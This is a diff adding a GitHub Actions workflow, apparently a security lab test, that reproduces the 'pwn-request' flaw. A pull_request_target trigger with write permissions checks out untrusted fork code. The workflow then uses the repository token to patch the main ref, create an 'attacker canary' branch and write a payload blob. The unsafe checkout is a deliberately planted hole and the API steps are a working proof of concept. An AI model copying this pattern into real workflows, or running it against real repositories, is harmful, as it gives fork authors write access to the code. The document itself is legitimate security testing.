@@ -1,0 +1,92 @@
+name: "Test 2: Fork PR (pull_request_target) - API PATCH + unsafe checkout"
+
+# The pwn-request pattern:
+# - pull_request_target runs with WRITE token even from fork PR
+# - If workflow also checks out fork HEAD, attacker code runs with write token
+# QUESTION: Can we PATCH main directly from this context?
+
+on:
+  pull_request_target:
+    types: [opened, synchronize]
+  workflow_dispatch:
+
+permissions:
+  contents: write
+  pull-requests: write
+
+jobs:
+  prt-api-patch:
+    runs-on: ubuntu-latest
+    steps:
+      - name: "Audit token - should show write"
+        run: |
+          echo "=== PRT TOKEN AUDIT ==="
+          echo "Event: ${{ github.event_name }}"
+          echo "Head repo: ${{ github.event.pull_request.head.repo.full_name }}"
+          echo "Is fork: ${{ github.event.pull_request.head.repo.fork }}"
+          # Token permissions via API
+          curl -s -I -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            "https://api.github.com/repos/${{ github.repository }}" \
+            | grep -i "x-oauth-scopes\|x-accepted-oauth-scopes\|content-type"
+
+      - name: "Unsafe checkout of fork HEAD (the dangerous pattern)"
+        uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+
+      - name: "PATCH main ref via API (write test)"
+        id: api_patch
+        run: |
+          MAIN_SHA=$(curl -s \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            "https://api.github.com/repos/twrps/api-bypass-lab/git/ref/heads/main" \
+            | jq -r '.object.sha')
+
+          HTTP=$(curl -s -w "%{http_code}" -o /tmp/pr.json -X PATCH \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Content-Type: application/json" \
+            -d "{\"sha\":\"$MAIN_SHA\",\"force\":false}" \
+            "https://api.github.com/repos/twrps/api-bypass-lab/git/refs/heads/main")
+          echo "PATCH HTTP: $HTTP"
+          echo "patch_http=$HTTP" >> $GITHUB_OUTPUT
+
+      - name: "Create attacker canary branch"
+        id: canary
+        run: |
+          MAIN_SHA=$(curl -s \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            "https://api.github.com/repos/twrps/api-bypass-lab/git/ref/heads/main" \
+            | jq -r '.object.sha')
+
+          HTTP=$(curl -s -w "%{http_code}" -o /tmp/canary.json -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Content-Type: application/json" \
+            -d "{\"ref\":\"refs/heads/canary-prt-${{ github.run_id }}\",\"sha\":\"$MAIN_SHA\"}" \
+            "https://api.github.com/repos/twrps/api-bypass-lab/git/refs")
+          echo "Canary branch create HTTP: $HTTP"
+          cat /tmp/canary.json | jq '.ref // .message'
+          echo "canary_http=$HTTP" >> $GITHUB_OUTPUT
+
+      - name: "Write file via Git Data API (contents:write from fork PR!)"
+        id: write_file
+        run: |
+          B64=$(echo "attacker payload from fork PR $(date)" | base64)
+          BLOB=$(curl -s -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Content-Type: application/json" \
+            -d "{\"content\":\"$B64\",\"encoding\":\"base64\"}" \
+            "https://api.github.com/repos/twrps/api-bypass-lab/git/blobs" | jq -r '.sha')
+          echo "Blob SHA: $BLOB"
+          echo "blob_sha=$BLOB" >> $GITHUB_OUTPUT
+
+      - name: "VERDICT"
+        run: |
+          echo "============================================"
+          echo "FORK PR (pull_request_target) API RESULTS"
+          echo "============================================"
+          echo "PATCH /refs:     ${{ steps.api_patch.outputs.patch_http }}"
+          echo "POST  canary:    ${{ steps.canary.outputs.canary_http }}"
+          echo "Blob created:    ${{ steps.write_file.outputs.blob_sha }}"
+          if [ "${{ steps.canary.outputs.canary_http }}" = "201" ]; then
+            echo "PWN-REQUEST WRITE CONFIRMED: fork PR has contents:write via pull_request_target"
+          fi
